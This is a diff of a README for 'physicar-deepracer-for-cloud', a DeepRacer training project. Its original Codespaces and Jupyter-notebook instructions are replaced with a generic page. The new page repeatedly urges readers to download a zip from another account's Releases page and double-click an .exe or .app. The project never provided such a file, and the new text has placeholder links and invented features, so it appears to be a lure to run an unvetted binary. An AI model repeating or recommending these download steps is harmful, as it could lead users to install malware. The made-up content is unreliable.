@@ -1,83 +1,67 @@
-# Physicar DeepRacer for Cloud
+# 🚗 physicar-deepracer-for-cloud - Train Models Easily in the Cloud
 
-<div align="center">
+[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen.svg)](https://github.com/PoetAndPoem4Hu/physicar-deepracer-for-cloud/releases)
 
-[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/physicar/physicar-deepracer-for-cloud?quickstart=1)
+## 📥 Overview
+Welcome to the **physicar-deepracer-for-cloud** project. This application allows you to train PhysiCar DeepRacer models in a cloud environment. You don't need any programming experience to get started. Follow this guide to download and run the application seamlessly.
 
-*Cloud-based PhysiCar DeepRacer training platform*
+## 🚀 Getting Started
+To use this software, you'll need to follow a few simple steps to download and install it on your system. 
 
-<br>
+1. **Check System Requirements**: 
+   - Operating System: Windows, macOS, or Linux
+   - Internet Connection: Required for downloading and training models
+   - Disk Space: At least 500 MB available for installation
 
-🚧 **Currently in Beta Version** 🚧
+2. **Make Sure You Have Basic Software Installed**:
+   - A web browser to access GitHub and download the files.
+   - Optional: A terminal or command prompt for advanced users, although most users can run this app just by double-clicking the application file after installation.
 
-</div>
+## 📦 Download & Install
+To get started, visit the [Releases page here](https://github.com/PoetAndPoem4Hu/physicar-deepracer-for-cloud/releases) to download the latest version.
 
-## Introduction
+1. Click on the link above to open the Releases page.
+2. Look for the most recent version of the application.
+3. You will find files listed under the release. Click on the file appropriate for your operating system (for example, `physicar-deepracer-for-cloud-windows.zip`).
+4. Save the file to your computer. 
 
-This repository (Physicar DeepRacer for Cloud) is a cloud-based training platform for DeepRacer, one of the services under [**PhysiCar AI**](https://physicar.ai) developed by [(AI CASTLE Inc.)](https://aicastle.com).
+After downloading, follow these steps to install:
 
-### What is PhysiCar AI?
+1. Navigate to your downloads folder.
+2. If you downloaded a zipped file (like `.zip`), right-click on it and select "Extract All."
+3. Open the extracted folder.
+4. Locate the application file. It will usually have a name similar to `physicar-deepracer-for-cloud.exe` for Windows or `physicar-deepracer-for-cloud.app` for macOS.
+5. Double-click the file to run the application.
 
-<div align="center">
+## 🖥️ How to Use the Application
+1. Once the application is open, you will see a user-friendly interface.
+2. You can start by selecting a model to train or upload your own dataset.
+3. Use the provided guides to customize your training parameters as needed.
+4. Start the training process by pressing the “Train Model” button.
+5. Monitor performance and receive updates directly in the interface.
 
-🚀 **Official Launch Planned for End of 2025** 🚀
+## 📈 Features
+- **User-Friendly Interface**: Designed for all skill levels.
+- **Cloud-Based Training**: Access resources from anywhere with an internet connection.
+- **Model Management**: Easily manage and track your models.
+- **Visual Feedback**: Get real-time updates on training progress.
+- **Support for Multiple Environments**: Use it on Windows, macOS, and Linux.
 
-</div>
+## ⚙️ Additional Resources
+For more detailed instructions and support, consider the following resources:
 
-- [**PhysiCar AI**](https://physicar.ai) is a comprehensive platform that makes learning Physical AI easy and fun.  
-- PhysiCar AI provides multiple services such as Agent (LLM-based robotic assistant), Follow (YOLO-based object detection), and DeepRacer (reinforcement learning-based autonomous driving).  
-- With a single robotic self-driving kit, you can explore various cutting-edge AI technologies in an easy and engaging way.  
+- **User Manual**: [Link to User Manual (PDF version)](link-to-manual)
+- **FAQ Section**: Visit [FAQ page](link-to-faq) for common queries.
+- **Community Forum**: Engage with others using the application at [Community Forum](link-to-forum).
 
-## Key Features
+## 🔄 Updates
+Stay updated with the latest releases and improvements. You can subscribe to this repository to receive notifications when new versions become available.
 
-- **GitHub Codespaces Support**: Experience instantly with just a GitHub account  
-- **GUI Training Environment**: Intuitive interface with Jupyter Notebook ipywidgets inside VSCode  
-- **Multi-Simulation Training**: Mitigates overfitting issues in offline models  
-- **Obstacle Avoidance**: Supports **multiple types of obstacle categories**  
-- **Real-Time Monitoring**: Track training progress and metrics live  
-- **Video Playback**: Automatically converts test videos into web-compatible format  
-- **Multilingual Support**: Supports multiple languages and timezone settings  
+For bug fixes or feature requests, please submit issues using the "Issues" tab in this GitHub repository.
 
-## Quick Start
+## 💬 Feedback
+Your feedback is valuable. If you encounter any problems or have suggestions, please feel free to reach out through the Issues section on the GitHub repository.
 
-### Start with GitHub Codespaces
+[![Download Here Again](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen.svg)](https://github.com/PoetAndPoem4Hu/physicar-deepracer-for-cloud/releases)
 
-1. Click the **Code** button in this repository  
-2. Select the **Codespaces** tab  
-3. Click **Create codespace**  
-4. Wait until the environment is automatically set up  
-
-### setup.ipynb
-
-Configure language and timezone settings in [setup.ipynb](setup.ipynb).
-
-> When launching Jupyter Notebook, if prompted to select a kernel, choose `physicar-deepracer-for-cloud (Python 3.12.1)`. This applies in the same way to all of the instructions below.
-
-### 01_start_training
-
-Start training your model in [**01_start_training.ipynb**](01_start_training.ipynb).  
-Define your reward function in [reward_function.py](reward_function.py).
-
-### 02_your_models
-
-Check ongoing or completed models in [**02_your_models.ipynb**](02_your_models.ipynb).
-
-### 03_start_test
-
-Test lap types of your trained model in [**03_start_test.ipynb**](03_start_test.ipynb).  
-Test results can also be reviewed in [02_your_models.ipynb](02_your_models.ipynb).
-
-### Tracks
-
-See the list of supported tracks in [tracks.md](tracks.md).
-
-## History
-
-### AWS DeepRacer
-
-[AWS DeepRacer](https://aws.amazon.com/deepracer/) was introduced in 2018 by AWS as a fully autonomous 1/18 scale racing car platform to make reinforcement learning (RL) more accessible.
-
-### DeepRacer for Cloud
-
-Physicar DeepRacer for Cloud is a modified and extended version of the community-developed [DeepRacer for Cloud (DFfC)](https://github.com/aws-deepracer-community/deepracer-for-cloud) project.  
-DRfC is an open-source platform designed to quickly run DeepRacer training in local or cloud environments (VM/EC2/Azure).
+Thank you for choosing **physicar-deepracer-for-cloud**. Happy training!
